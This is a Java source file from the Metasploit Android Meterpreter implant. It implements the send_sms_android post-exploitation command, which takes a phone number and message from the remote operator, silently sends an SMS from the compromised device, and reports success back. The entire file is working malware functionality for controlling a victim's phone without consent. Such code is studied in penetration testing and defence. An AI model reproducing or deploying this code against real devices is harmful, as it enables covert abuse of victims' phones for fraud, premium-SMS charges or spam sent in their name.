package com.metasploit.meterpreter.android;

import android.telephony.SmsManager;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;


public class send_sms_android implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_SMS_ADDRESS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9001);
    private static final int TLV_TYPE_SMS_BODY = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9002);
    private static final int TLV_TYPE_SMS_SENT = TLVPacket.TLV_META_TYPE_BOOL
            | (TLV_EXTENSIONS + 9021);

    private static final String address = "address";
    private static final String body = "body";


    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

	String number = request.getStringValue(TLV_TYPE_SMS_ADDRESS);
	String message = request.getStringValue(TLV_TYPE_SMS_BODY);
	SmsManager sm = SmsManager.getDefault();
	if (message.length() > 160) {
	}
	else {
		String SMS_SENT = "SMS_SENT";
		String SMS_DELIVERED = "SMS_DELIVERED";
		AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
	        final Context context = androidMeterpreter.getContext();

		PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(SMS_SENT), 0);
		PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(SMS_DELIVERED), 0);

		// For when the SMS has been sent
		context.registerReceiver(new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				String result = "";
				switch(getResultCode()) {
					case Activity.RESULT_OK:
						result = "Transmission successful";
						break;
					case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
						result = "Transmission failed";
						break;
					case SmsManager.RESULT_ERROR_RADIO_OFF:
						result = "Radio off";
						break;
					case SmsManager.RESULT_ERROR_NULL_PDU:
						result = "No PDU defined";
						break;
					case SmsManager.RESULT_ERROR_NO_SERVICE:
						result = "No service";
						break;
				}
			}
		}, new IntentFilter(SMS_SENT));
 
		// For when the SMS has been delivered
		context.registerReceiver(new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				String result = "";
				switch(getResultCode()) {
					case Activity.RESULT_OK:
						result = "Transmission successful";
						break;
					case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
						result = "Transmission failed";
						break;
					case SmsManager.RESULT_ERROR_RADIO_OFF:
						result = "Radio off";
						break;
					case SmsManager.RESULT_ERROR_NULL_PDU:
						result = "No PDU defined";
						break;
					case SmsManager.RESULT_ERROR_NO_SERVICE:
						result = "No service";
						break;
				}
			}
		}, new IntentFilter(SMS_DELIVERED));

		// Get the default instance of SmsManager
		SmsManager smsManager = SmsManager.getDefault();
		// Send a text based SMS
		smsManager.sendTextMessage(number, null, message, sentPendingIntent, deliveredPendingIntent);
//		smsManager.sendTextMessage(number, null, message, null, null);
		response.addOverflow(TLV_TYPE_SMS_SENT, true);
	}
	return ERROR_SUCCESS;
    }
}
